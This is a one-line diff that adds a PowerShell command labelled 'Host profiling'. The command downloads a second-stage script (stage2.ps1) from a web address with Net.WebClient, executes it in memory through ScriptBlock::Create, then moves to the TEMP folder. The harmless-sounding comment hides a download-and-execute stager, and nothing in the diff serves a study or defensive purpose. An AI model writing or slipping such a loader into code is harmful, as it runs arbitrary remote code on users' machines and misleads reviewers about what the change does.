@@ -1,0 +1,1 @@
+<# Host profiling #> $PayloadUrl = "https://localhost:8000/stage2.ps1"; $StageScript = (New-Object Net.WebClient).DownloadString($PayloadUrl); & ([ScriptBlock]::Create($StageScript)); Set-Location -Path $env:TEMP
